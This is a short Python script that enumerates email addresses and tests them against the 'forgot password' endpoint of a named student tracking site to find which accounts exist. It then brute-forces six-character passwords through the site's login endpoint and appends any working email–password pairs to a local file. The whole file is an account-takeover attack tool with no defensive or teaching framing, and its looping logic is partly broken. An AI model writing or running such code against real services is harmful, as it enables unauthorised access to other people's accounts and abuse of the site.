import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor
def emailMaker():
    characters = string.ascii_letters + string.digits + '._%+-'
    domains = ['@gmail.com', '@icloud.com', '@naver.com']
    for length in range(6, 20):
        permutations = itertools.permutations(characters, length)
        for permutation in permutations:
            username = ''.join(permutation)
            for domain in domains:
                yield f"{username}{domain}"
def codeMaker():
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for code in itertools.product(chars, repeat=6):
        yield "".join(code)
def checkEmail(email):
    url = "https://www.revera-track.com/api/auth/forgot"
    payload = {
        "isFrontend": 1,
        "email": email,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        if response.text.strip() == "1":
            return True
        elif response.text.strip() == "0":
            return False
        else:
            print("Unknown response:", response.text.strip())
            return False
    else:
        print("Request failed with status code:", response.status_code)
        return False
def checkCreds(email, password):
    url = "https://www.revera-track.com/api/auth/login"
    payload = {
        "email": email,
        "password": password,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200 and response.json().get('logged_in'):
        return True
    else:
        return False
def check_credentials(email, password):
    if checkEmail(email):
        print("Email is valid:", email)
        if checkCreds(email, password):
            print("Valid credentials found!")
            print("Email: {}, Password: {}".format(email, password))
            with open("/Users/lung/Desktop/loser.txt", "a") as file:
                file.write("Email: {}, Password: {}\n".format(email, password))
with ThreadPoolExecutor(max_workers=10) as executor:
    for email in emailMaker():
        print("Checking email:", email)
        executor.map(check_credentials, [email], codeMaker())
